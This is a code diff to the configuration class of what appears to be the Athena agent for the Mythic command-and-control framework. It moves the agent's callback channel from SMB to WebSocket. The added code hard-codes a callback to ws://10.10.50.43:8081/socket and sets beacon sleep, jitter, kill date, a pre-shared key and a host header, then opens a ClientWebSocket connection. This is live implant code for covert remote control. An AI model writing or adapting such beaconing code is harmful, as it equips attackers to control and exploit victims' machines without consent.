@@ -12,12 +12,12 @@ namespace Athena.Config
 {
     public class MythicConfig
     {
-        public SmbClient currentConfig { get; set; }
+        public Websocket currentConfig { get; set; }
         public string uuid { get; set; }
         public DateTime killDate { get; set; }
         public int sleep { get; set; }
         public int jitter { get; set; }
-        public SmbServer smbServer { get; set; }
+        public SmbServer smbConfig { get; set; }
 
         public MythicConfig()
         {
@@ -34,19 +34,26 @@ namespace Athena.Config
             this.sleep = sleep;
             int jitter = int.TryParse("0", out jitter) ? jitter : 10;
             this.jitter = jitter;
-            this.currentConfig = new SmbClient(this.uuid);
-            this.smbConfig = new SMBConfig();
+            this.currentConfig = new Websocket(this.uuid);
+            this.smbConfig = new SmbServer();
         }
     }
 
-    public class SmbClient
+    public class Websocket
     {
         public string psk { get; set; }
+        public string endpoint { get; set; }
+        public string userAgent { get; set; }
         public string callbackHost { get; set; }
+        public int callbackInterval { get; set; }
+        public int callbackJitter { get; set; }
+        public int callbackPort { get; set; }
+        public string hostHeader { get; set; }
         public bool encryptedExchangeCheck { get; set; }
+        public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
 
-        public SMBClient(string uuid)
+        public Websocket(string uuid)
         {
             //int callbackPort = Int32.Parse("callback_port");
             //string callbackHost = "callback_host";
@@ -57,7 +64,11 @@ namespace Athena.Config
             //this.psk = "AESPSK";
             //this.encryptedExchangeCheck = bool.Parse("encrypted_exchange_check");
             int callbackPort = Int32.Parse("8081");
-            string callbackHost = "smb_servers";
+            string callbackHost = "ws://10.10.50.43";
+            this.endpoint = "socket";
+            string callbackURL = $"{callbackHost}:{callbackPort}/{endpoint}";
+            this.userAgent = "USER_AGENT";
+            this.hostHeader = "%HOSTHEADER%";
             this.psk = "";
             this.encryptedExchangeCheck = bool.Parse("False");
             if (!string.IsNullOrEmpty(this.psk))
@@ -66,6 +77,7 @@ namespace Athena.Config
                 Globals.encrypted = true;
             }
 
+            this.ws = new ClientWebSocket();
             Connect(callbackURL);
         }
 
